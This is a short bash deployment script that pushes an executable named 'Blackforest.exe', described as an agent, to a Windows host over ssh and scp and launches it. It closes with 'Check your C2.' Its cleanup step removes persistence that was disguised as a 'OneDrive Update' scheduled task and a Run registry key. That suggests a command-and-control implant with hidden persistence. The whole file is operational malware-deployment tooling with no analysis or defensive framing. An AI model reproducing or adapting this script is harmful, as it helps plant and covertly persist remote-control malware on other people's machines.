#!/bin/bash
# scripts/manual_deploy.sh
# Interactive Deployment - Handles usernames with spaces!

# Quote the entire string if it has spaces
TARGET="pss trust@192.168.0.6"

echo "=============================================="
echo "MANUAL DEPLOYMENT TO: $TARGET"
echo "You will be asked for the password 3 times."
echo "=============================================="
echo ""

# 1. Cleanup
echo "[STEP 1/3] CLEANING UP OLD AGENT..."
echo "Running remote kill command. Type password >>"
# Use quotes around "$TARGET" to handle the space in "pss trust"
ssh "$TARGET" "Stop-Process -Name 'Blackforest' -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BlackforestUpdater' -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName 'OneDrive Update' -Confirm:\$false -ErrorAction SilentlyContinue; Remove-Item \"\$env:APPDATA\Blackforest\" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item \"\$env:USERPROFILE\Downloads\Blackforest.exe\" -Force -ErrorAction SilentlyContinue"

# 2. Upload
echo ""
echo "[STEP 2/3] UPLOADING LEVEL 5 AGENT..."
echo "Uploading bin/Blackforest.exe. Type password >>"
# Relative path 'Downloads/' resolves to C:\Users\pss trust\Downloads automatically
scp bin/Blackforest.exe "$TARGET:Downloads/Blackforest.exe"

# 3. Execution
echo ""
echo "[STEP 3/3] EXECUTING..."
echo "Starting process. Type password >>"
ssh "$TARGET" "Start-Process \"\$env:USERPROFILE\Downloads\Blackforest.exe\""

echo ""
echo "[+] DEPLOYMENT COMPLETE. Check your C2."
